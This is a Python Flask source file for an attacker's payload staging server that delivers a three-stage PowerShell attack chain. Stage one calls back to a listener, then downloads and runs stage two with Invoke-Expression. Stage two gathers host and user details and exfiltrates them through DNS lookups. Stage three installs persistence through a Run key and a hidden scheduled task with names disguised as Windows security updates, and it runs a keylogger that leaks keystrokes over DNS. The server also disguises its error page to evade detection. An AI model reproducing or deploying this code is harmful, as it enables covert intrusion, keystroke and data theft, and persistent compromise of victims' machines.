# Staging Server for Metamorphic Payloads
# This server hosts the staged payloads that get downloaded and executed in memory

from flask import Flask, request, send_from_directory, jsonify, abort
import os
import base64
import hashlib
import time
from pathlib import Path
import mimetypes

app = Flask(__name__)

# Configuration
STAGING_PORT = 8081
STAGING_HOST = '0.0.0.0'
STAGING_DIR = Path('./staging_payloads')
ALLOWED_IPS = ['127.0.0.1', '::1']  # Add your allowed IPs here

# Ensure staging directory exists
STAGING_DIR.mkdir(exist_ok=True)

class StagingPayloadManager:
    """Manages staged payloads with encryption and obfuscation"""
    
    def __init__(self):
        self.payloads = {}
        self.access_logs = []
    
    def create_staged_payload(self, content: str, encryption_key: str = None, payload_id: str = None) -> str:
        """Create a staged payload and return its ID"""
        if not payload_id:
            payload_id = hashlib.md5(f"{content}{time.time()}".encode()).hexdigest()[:16]
        
        # Encrypt if key provided
        if encryption_key:
            content = self._encrypt_content(content, encryption_key)
        
        # Store payload
        self.payloads[payload_id] = {
            'content': content,
            'encrypted': bool(encryption_key),
            'created': time.time(),
            'accessed': 0,
            'last_access': None
        }
        
        return payload_id
    
    def get_staged_payload(self, payload_id: str, client_ip: str = None) -> str:
        """Retrieve a staged payload"""
        if payload_id not in self.payloads:
            return None
        
        payload = self.payloads[payload_id]
        payload['accessed'] += 1
        payload['last_access'] = time.time()
        
        # Log access
        self.access_logs.append({
            'payload_id': payload_id,
            'client_ip': client_ip,
            'timestamp': time.time()
        })
        
        return payload['content']
    
    def _encrypt_content(self, content: str, key: str) -> str:
        """Simple XOR encryption for content"""
        key_bytes = key.encode('utf-8')
        content_bytes = content.encode('utf-8')
        
        encrypted = bytearray()
        for i, byte in enumerate(content_bytes):
            encrypted.append(byte ^ key_bytes[i % len(key_bytes)])
        
        return base64.b64encode(encrypted).decode('ascii')

# Global staging manager
staging_manager = StagingPayloadManager()

@app.before_request
def limit_remote_addr():
    """Basic IP filtering for security"""
    client_ip = request.environ.get('HTTP_X_FORWARDED_FOR', request.remote_addr)
    if request.endpoint and request.endpoint.startswith('stage_') and client_ip not in ALLOWED_IPS:
        # In production, remove this or configure proper IP filtering
        pass  # Allow all for demonstration

@app.route('/health')
def health():
    """Health check endpoint"""
    return jsonify({
        'status': 'healthy',
        'active_payloads': len(staging_manager.payloads),
        'total_accesses': sum(p['accessed'] for p in staging_manager.payloads.values())
    })

# Stage 1: Basic PowerShell reverse shell
@app.route('/stage1')
@app.route('/stage1.ps1')
def stage1():
    """First stage payload - basic connection"""
    client_ip = request.environ.get('HTTP_X_FORWARDED_FOR', request.remote_addr)
    
    payload_content = '''
# Stage 1 - Initial Connection
try {
    $c = New-Object System.Net.Sockets.TCPClient('127.0.0.1', 4444)
    $s = $c.GetStream()
    $w = New-Object System.IO.StreamWriter($s)
    $w.WriteLine("Stage 1 Connected from $env:COMPUTERNAME")
    $w.Flush()
    $c.Close()
} catch {}

# Download and execute stage 2
try {
    $wc = New-Object System.Net.WebClient
    $stage2 = $wc.DownloadString('http://127.0.0.1:8081/stage2')
    Invoke-Expression $stage2
} catch {}
'''
    
    payload_id = staging_manager.create_staged_payload(payload_content, client_ip=client_ip)
    print(f"Stage 1 accessed by {client_ip} - Payload ID: {payload_id}")
    
    return payload_content, 200, {'Content-Type': 'text/plain'}

# Stage 2: Enhanced capabilities
@app.route('/stage2')
@app.route('/stage2.ps1')
def stage2():
    """Second stage payload - enhanced features"""
    client_ip = request.environ.get('HTTP_X_FORWARDED_FOR', request.remote_addr)
    
    payload_content = '''
# Stage 2 - Enhanced Capabilities
function Get-SystemInfo {
    return @{
        Computer = $env:COMPUTERNAME
        User = $env:USERNAME
        OS = (Get-WmiObject -Class Win32_OperatingSystem).Caption
        Architecture = $env:PROCESSOR_ARCHITECTURE
        PowerShell = $PSVersionTable.PSVersion.ToString()
    }
}

function Send-Data {
    param([string]$Data)
    try {
        $bytes = [System.Text.Encoding]::UTF8.GetBytes($Data)
        $encoded = [Convert]::ToBase64String($bytes)
        # Send via DNS or HTTP exfiltration
        $null = Resolve-DnsName "$encoded.example.com" -ErrorAction SilentlyContinue
    } catch {}
}

# Collect and exfiltrate system info
$info = Get-SystemInfo | ConvertTo-Json -Compress
Send-Data -Data $info

# Download final stage
try {
    $wc = New-Object System.Net.WebClient
    $wc.Headers.Add('User-Agent', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)')
    $stage3 = $wc.DownloadString('http://127.0.0.1:8081/stage3')
    Invoke-Expression $stage3
} catch {}
'''
    
    payload_id = staging_manager.create_staged_payload(payload_content, client_ip=client_ip)
    print(f"Stage 2 accessed by {client_ip} - Payload ID: {payload_id}")
    
    return payload_content, 200, {'Content-Type': 'text/plain'}

# Stage 3: Persistence and advanced features
@app.route('/stage3')
@app.route('/stage3.ps1')
def stage3():
    """Third stage payload - persistence"""
    client_ip = request.environ.get('HTTP_X_FORWARDED_FOR', request.remote_addr)
    
    payload_content = '''
# Stage 3 - Persistence and Advanced Features
function Install-Persistence {
    try {
        $script = @"
try {
    `$wc = New-Object System.Net.WebClient
    `$payload = `$wc.DownloadString('http://127.0.0.1:8081/stage1')
    Invoke-Expression `$payload
} catch {}
"@
        
        # Registry persistence
        $regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
        $name = "WindowsSecurityUpdate"
        $value = "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -Command `"$script`""
        
        Set-ItemProperty -Path $regPath -Name $name -Value $value -ErrorAction SilentlyContinue
        
        # Scheduled task persistence
        $action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-WindowStyle Hidden -ExecutionPolicy Bypass -Command `"$script`""
        $trigger = New-ScheduledTaskTrigger -AtLogOn
        $settings = New-ScheduledTaskSettingsSet -Hidden
        Register-ScheduledTask -TaskName "WindowsSecurityCheck" -Action $action -Trigger $trigger -Settings $settings -ErrorAction SilentlyContinue
        
    } catch {}
}

function Start-Keylogger {
    try {
        Add-Type -AssemblyName System.Windows.Forms
        $buffer = ""
        
        for ($i = 0; $i -lt 100; $i++) {
            Start-Sleep -Milliseconds 10
            foreach ($key in [Enum]::GetValues([System.Windows.Forms.Keys])) {
                if ([System.Windows.Forms.Control]::IsKeyLocked($key)) {
                    $buffer += $key.ToString()
                    if ($buffer.Length -gt 50) {
                        # Exfiltrate keystrokes
                        $encoded = [Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($buffer))
                        $null = Resolve-DnsName "keys-$encoded.example.com" -ErrorAction SilentlyContinue
                        $buffer = ""
                    }
                }
            }
        }
    } catch {}
}

# Execute advanced features
Install-Persistence
Start-Job -ScriptBlock { Start-Keylogger } | Out-Null

# Final callback
try {
    $c = New-Object System.Net.Sockets.TCPClient('127.0.0.1', 4444)
    $s = $c.GetStream()
    $w = New-Object System.IO.StreamWriter($s)
    $w.WriteLine("All stages completed successfully on $env:COMPUTERNAME")
    $w.Flush()
    $c.Close()
} catch {}
'''
    
    payload_id = staging_manager.create_staged_payload(payload_content, client_ip=client_ip)
    print(f"Stage 3 accessed by {client_ip} - Payload ID: {payload_id}")
    
    return payload_content, 200, {'Content-Type': 'text/plain'}

# Encrypted payload endpoint
@app.route('/encrypted/<payload_id>')
def get_encrypted_payload(payload_id):
    """Serve encrypted payloads"""
    client_ip = request.environ.get('HTTP_X_FORWARDED_FOR', request.remote_addr)
    
    payload = staging_manager.get_staged_payload(payload_id, client_ip)
    if not payload:
        abort(404)
    
    print(f"Encrypted payload {payload_id} accessed by {client_ip}")
    return payload, 200, {'Content-Type': 'application/octet-stream'}

# DLL payload for reflective loading
@app.route('/payload.dll')
def serve_dll():
    """Serve a fake DLL for reflective loading demonstration"""
    client_ip = request.environ.get('HTTP_X_FORWARDED_FOR', request.remote_addr)
    
    # In reality, this would be a compiled .NET DLL
    # For demonstration, we return a base64-encoded fake assembly
    fake_dll_content = base64.b64encode(b"FAKE_DLL_CONTENT_FOR_DEMO").decode()
    
    print(f"DLL payload accessed by {client_ip}")
    return fake_dll_content, 200, {'Content-Type': 'application/octet-stream'}

# Management endpoints
@app.route('/admin/payloads')
def list_payloads():
    """List all staged payloads (admin endpoint)"""
    return jsonify({
        'payloads': {
            pid: {
                'encrypted': payload['encrypted'],
                'created': payload['created'],
                'accessed': payload['accessed'],
                'last_access': payload['last_access']
            }
            for pid, payload in staging_manager.payloads.items()
        },
        'access_logs': staging_manager.access_logs[-50:]  # Last 50 accesses
    })

@app.route('/admin/create', methods=['POST'])
def create_payload():
    """Create a new staged payload"""
    data = request.get_json()
    if not data or 'content' not in data:
        return jsonify({'error': 'Missing content'}), 400
    
    payload_id = staging_manager.create_staged_payload(
        data['content'],
        data.get('encryption_key'),
        data.get('payload_id')
    )
    
    return jsonify({
        'payload_id': payload_id,
        'url': f"http://{request.host}/encrypted/{payload_id}"
    })

# Custom 404 handler
@app.errorhandler(404)
def not_found(e):
    # Return a legitimate-looking 404 to avoid detection
    return '''<!DOCTYPE html>
<html>
<head><title>404 Not Found</title></head>
<body>
<center><h1>404 Not Found</h1></center>
<hr><center>nginx/1.18.0</center>
</body>
</html>''', 404

if __name__ == '__main__':
    print(f"Starting Staging Server on {STAGING_HOST}:{STAGING_PORT}")
    print(f"Staging directory: {STAGING_DIR.absolute()}")
    print("Available endpoints:")
    print("  /stage1, /stage2, /stage3 - Multi-stage payloads")
    print("  /payload.dll - Reflective DLL")
    print("  /encrypted/<id> - Encrypted payloads")
    print("  /admin/payloads - Payload management")
    print("  /health - Health check")
    print()
    
    app.run(host=STAGING_HOST, port=STAGING_PORT, debug=True)
